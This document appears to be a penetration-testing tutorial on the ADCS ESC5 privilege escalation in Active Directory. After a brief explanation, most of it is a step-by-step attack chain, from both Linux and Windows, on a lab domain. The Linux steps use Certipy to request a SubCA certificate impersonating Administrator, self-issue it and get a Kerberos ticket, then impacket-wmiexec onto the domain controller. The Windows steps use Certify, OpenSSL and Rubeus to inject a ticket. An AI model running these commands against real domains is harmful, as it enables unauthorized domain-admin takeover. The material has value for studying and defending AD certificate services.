The `ESC5` is another domain escalation that abuses access controls over Active Directory objects indirectly connected to Active Directory Certificate Services. Other than the templates or Certificate Authority service, these objects can allow privilege escalation via ADCS.


## Requisites
To abuse ESC5 we need to have rights over an account that has privileges over AD objects, including (but not limited to):
- The CA server’s AD computer object (i.e., compromise through S4U2Self or S4U2Proxy).
- The CA server’s RPC/DCOM server.
- Any descendant AD object or container in the container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<COMPANY>,DC=<COM>` (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services Container, etc.

Compromising any of these elements by a low-privileged attacker could likely result in a PKI system compromise.


## Enumeration
As named in the requisites there is no commands that can be sent to identify this attack since it relays on AD permission over object, so check in Bloodhound or similar for permissions over account that can edit/manager the ADCS objects described in the paragraph above.


# Attack Scenario
In this scenario, we have access to the user `cken`, Local Administrator in `WS01`. We also have access to the user `llane`, who has `GenericAll` privileges on the `WS01` machine object. `cken` is a local administrator on `WS01`. In the case of `llane`, we would have to execute the RBCD attack if we want to gain administrator access. We will use the user `cken` to attack the ADCS server.

- We start by checking all the Templates as **cken** user. In this case **Certipy** doesn't know if we are Admin or not so we should understand that. However, as Administrators, we can abuse `ESC4`, `ESC7`, or any other vulnerability where we use elevated privileges to modify components of the ADCS server.
```
certipy-ad find -u cken -p Superman001 -dc-ip 172.16.19.3 -stdout -ns 172.16.19.3 -dns-tcp
```
- Now we can perform a ESC7 attack path since our user is part of the Domain Admins.
```
certipy-ad req -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -template SubCA -upn Administrator@lab.local

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate. 
[*] Request ID is 10
Would you like to save the private key? (y/N) y
[*] Saved private key to 10.key
[-] Failed to request certificate
```
- Let's re-issue the certificate with the ID from before
```
certipy-ad ca -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -issue-request 10
```
- And retrive the pfx again with same ID number.
```
certipy-ad req -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -retrieve 10
```
- Next, as usual perform a authentication to get a valid TGT kerberos ticket.
```
certipy-ad auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp
```
- Lastly, point to the *ccache* and use it for you needs.
```
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass LAB-DC.LAB.LOCAL -dc-ip 172.16.19.3
```


# Attack from Windows
Same can be archived directly from a Windows environment with the following steps.
- Start by enumerating the environment with the following commando.
```
.\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=lab,DC=local'

[*] Listing info about the Enterprise CA 'lab-WS01-CA'

    Enterprise CA Name            : lab-WS01-CA
    DNS Hostname                  : WS01.lab.local
    FullName                      : WS01.lab.local\lab-WS01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=lab-WS01-CA, DC=lab, DC=local
    Cert Thumbprint               : A98F0A82A9D93D069F4CB39AA9B2F84A987B543B
    Cert Serial                   : 238F549429FFF796430B5F486159490B
    Cert Start Date               : 7/6/2023 4:44:47 AM
    Cert End Date                 : 7/6/2122 4:54:47 AM
    Cert Chain                    : CN=lab-WS01-CA,DC=lab,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               DC\Domain Admins              S-1-5-21-1817219280-1014233819-995920665-512
      Allow  ManageCA, ManageCertificates               DC\Enterprise Admins          S-1-5-21-1817219280-1014233819-995920665-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!
```
What we are looking for here is that the tool identified that our user is part of the **built-in Administrators** which gives us access over the *ADCS modules*.
- We issue a certificate with the *SubCA* template, it will fail, but that is okay.
```
.\Certify.exe  request /ca:WS01.lab.local\lab-WS01-CA /template:SubCA /altname:Administrator
```
- Re-issue the certificate from a GUI `certsrv.msc`.
- Download the issued certificate
```
.\Certify.exe download /ca:WS01.lab.local\lab-WS01-CA /id:10
```
- Convert again as usual from PEM to PFX
```
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in approved.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out approved.pfx
```
- Request the TGT and inject it in the same session.
```powershell-session
.\Rubeus.exe asktgt /user:administrator /certificate:approved.pfx /getcredentials /ptt
```
Enjoy the TGT for further attacks in the environment.